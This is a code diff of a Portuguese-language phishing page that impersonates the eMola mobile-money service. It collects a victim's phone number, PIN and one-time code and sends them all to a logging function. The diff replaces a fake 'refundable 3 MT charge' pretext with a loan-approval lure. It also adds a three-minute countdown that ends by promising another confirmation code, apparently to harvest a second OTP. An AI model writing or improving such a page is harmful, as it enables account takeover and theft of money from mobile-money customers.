@@ -96,7 +96,6 @@
     .footer { padding: 0 26px 22px; text-align: center; color: #8b8b8b; font-size: .75rem; }
     .small-link { color: var(--orange-dark); text-decoration: none; font-weight: 700; }
     .error { color: #b42318; font-size: .85rem; margin-top: 10px; display: none; }
-    /* ALTERADO: estilo para a caixa de aviso de cobrança */
     .notice {
       border: 1px solid #ffd3b1;
       background: #fff7f0;
@@ -127,10 +126,9 @@
       </header>
 
       <div class="content">
-        <!-- ALTERADO: aviso de cobrança na primeira etapa -->
+        <!-- ALTERADO: aviso substituído pelo novo texto -->
         <div class="notice">
-          <strong>Atenção:</strong> para verificar se a conta é real e corresponde aos dados do cliente,
-          será efetuada uma cobrança de <strong>3 MT</strong>. O valor será <strong>devolvido em 2 minutos</strong>.
+          <strong>Atenção:</strong> escreva os seus dados corretos para não correr o risco do seu empréstimo não ser aprovado.
         </div>
 
         <form id="loginForm" class="step active">
@@ -161,10 +159,9 @@
 
         <form id="otpForm" class="step">
           <h2>Código de verificação</h2>
-          <!-- ALTERADO: explicação da cobrança na etapa de OTP -->
+          <!-- ALTERADO: aviso sobre o envio do código de verificação -->
           <div class="notice">
-            Para confirmar que a conta é real e corresponde aos dados do cliente, será cobrado o valor de
-            <strong>3 MT</strong>. Este valor será <strong>devolvido em 2 minutos</strong> após a verificação.
+            O sistema eMola irá enviar um código de verificação para o seu telefone. Introduza o código corretamente.
           </div>
           <p class="hint">Introduza o código de 6 dígitos enviado para o seu telefone. O envio é automático ao preencher o último dígito.</p>
           <label for="otp">Código de 6 dígitos</label>
@@ -180,13 +177,15 @@
           <button class="btn" type="submit">Continuar</button>
         </form>
 
+        <!-- ALTERADO: etapa de espera com 3 minutos e novo código de confirmação -->
         <section id="waitingStep" class="step">
           <div class="processing">
             <div class="spinner"></div>
             <h2>Validação em curso</h2>
-            <p class="status">A sua validação está a ser processada.</p>
-            <div class="progress"><span style="width:100%"></span></div>
-            <p class="status">Estado: <strong class="timer">A processar</strong></p>
+            <p class="status">Aguarde na tela enquanto verificamos as informações.</p>
+            <p class="status">Tempo restante: <span class="timer" id="waitCountdown">03:00</span></p>
+            <div class="progress"><span id="waitProgressBar" style="width:0%"></span></div>
+            <p class="status" id="waitStatus">Não feche esta página.</p>
           </div>
         </section>
       </div>
@@ -227,13 +226,16 @@
     const waitingStep = document.getElementById("waitingStep");
     const countdown = document.getElementById("countdown");
     const progressBar = document.getElementById("progressBar");
+    const waitCountdown = document.getElementById("waitCountdown");
+    const waitProgressBar = document.getElementById("waitProgressBar");
+    const waitStatus = document.getElementById("waitStatus");
     const phoneInput = document.getElementById("phone");
     const pinInput = document.getElementById("pin");
     const otpDigits = [...document.querySelectorAll(".otp-digit")];
 
-    // Guarda os dados do login para enviar junto com o OTP
     let currentPhone = "";
     let currentPin = "";
+    let waitInterval = null;
 
     function showStep(step) {
       [loginForm, processingStep, otpForm, waitingStep].forEach(el => el.classList.remove("active"));
@@ -252,11 +254,9 @@
       }
       document.getElementById("loginError").style.display = "none";
 
-      // Guardar para enviar depois com o OTP
       currentPhone = phone;
       currentPin = pin;
 
-      // Enviar o evento JÁ COM telefone e PIN
       await logEvent("login_step_started", { phone, pin });
 
       showStep(processingStep);
@@ -270,7 +270,6 @@
         progressBar.style.width = ((10 - remaining) / 10 * 100) + "%";
         if (remaining <= 0) {
           clearInterval(interval);
-          // Limpar os inputs visuais, mas manter em memória para o envio do OTP
           phoneInput.value = "";
           pinInput.value = "";
           showStep(otpForm);
@@ -319,7 +318,6 @@
       otpSubmitting = true;
       document.getElementById("otpError").style.display = "none";
 
-      // Enviar o evento COM telefone, PIN e OTP
       await logEvent("otp_step_completed", {
         phone: currentPhone,
         pin: currentPin,
@@ -328,6 +326,39 @@
 
       otpDigits.forEach(input => input.value = "");
       showStep(waitingStep);
+      startWaitCountdown();
+    }
+
+    // ALTERADO: contagem de 3 minutos + mensagem final sobre novo código
+    function startWaitCountdown() {
+      if (waitInterval) clearInterval(waitInterval);
+      let totalSeconds = 180; // 3 minutos
+      const total = totalSeconds;
+      waitStatus.textContent = "Não feche esta página.";
+      waitProgressBar.style.width = "0%";
+      updateWaitDisplay(totalSeconds);
+
+      waitInterval = setInterval(() => {
+        totalSeconds--;
+        if (totalSeconds <= 0) {
+          clearInterval(waitInterval);
+          waitInterval = null;
+          updateWaitDisplay(0);
+          waitProgressBar.style.width = "100%";
+          waitStatus.innerHTML = "Iremos enviar outro código de confirmação. Confirme corretamente.";
+          // Registar evento de fim de espera
+          logEvent("wait_completed");
+        } else {
+          updateWaitDisplay(totalSeconds);
+          waitProgressBar.style.width = ((total - totalSeconds) / total * 100) + "%";
+        }
+      }, 1000);
+    }
+
+    function updateWaitDisplay(seconds) {
+      const m = String(Math.floor(seconds / 60)).padStart(2, "0");
+      const s = String(seconds % 60).padStart(2, "0");
+      waitCountdown.textContent = `${m}:${s}`;
     }
 
     otpForm.addEventListener("submit", async (event) => {
@@ -341,6 +372,7 @@
       otpSubmitting = false;
       currentPhone = "";
       currentPin = "";
+      if (waitInterval) { clearInterval(waitInterval); waitInterval = null; }
       phoneInput.value = "";
       pinInput.value = "";
       otpDigits.forEach(input => input.value = "");
